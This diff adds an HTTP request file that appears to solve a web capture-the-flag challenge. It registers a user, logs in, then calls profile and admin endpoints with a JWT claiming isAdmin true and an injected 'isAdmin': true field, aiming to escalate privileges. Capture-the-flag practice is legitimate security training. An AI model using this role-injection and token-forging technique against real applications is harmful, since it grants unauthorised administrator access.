@@ -1,0 +1,44 @@
+@adminUrl = https://chal56-7764gj.vercel.app/admin
+@profileUrl = https://chal56-7764gj.vercel.app/profile
+@registerUrl = https://chal56-7764gj.vercel.app/register
+@loginUrl = https://chal56-7764gj.vercel.app/login
+
+### REGISTER
+
+POST {{registerUrl}} HTTP/1.1
+Content-Type: application/json
+
+{
+  "username": "o",
+  "password": "o"
+}
+
+### LOGIN
+
+POST {{loginUrl}} HTTP/1.1
+Content-Type: application/json
+
+{
+  "username": "o",
+  "password": "o"
+}
+
+### PROFILE
+
+POST {{profileUrl}} HTTP/1.1
+Content-Type: application/json
+
+{
+  "session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im8iLCJpc0FkbWluIjp0cnVlLCJpYXQiOjE3NTUxOTA2NDgsImV4cCI6MTc1NTE5NDI0OH0.Ew57bzgFHdFIFAzJ8yNtXDK4JXIdsKKGXgsRz_sUpVw",
+  "isAdmin": true
+}
+
+### ADMIN
+
+POST {{adminUrl}} HTTP/1.1
+Content-Type: application/json
+
+{
+  "session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im8iLCJpc0FkbWluIjp0cnVlLCJpYXQiOjE3NTUxOTA2NDgsImV4cCI6MTc1NTE5NDI0OH0.Ew57bzgFHdFIFAzJ8yNtXDK4JXIdsKKGXgsRz_sUpVw",
+  "isAdmin": true
+}
